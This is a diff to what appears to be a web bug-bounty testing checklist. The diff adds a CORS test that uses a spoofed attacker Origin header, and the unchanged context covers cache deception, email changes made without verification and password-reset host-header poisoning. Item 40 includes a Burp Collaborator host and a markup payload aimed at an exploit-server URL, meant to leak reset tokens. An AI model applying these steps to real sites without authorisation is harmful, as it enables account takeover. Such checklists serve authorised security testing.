@@ -50,7 +50,7 @@
  39- try cache deception attack by going to page with senstive information and put file.css in url and try to access many times it should show the senstive page 
 40- try to put port in host: example.com:123 in reset password and see if that is reflected in email reset password token and if so add https://example.com:@burpcollaborator.net  or "'><a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
 41- edit email and see if happened without verification p4 vulnerablity 
-
+42- edit Origin : domain[.]com[.]attacker[.]com ==> if accepted then cors misconfigration 
 
 
 
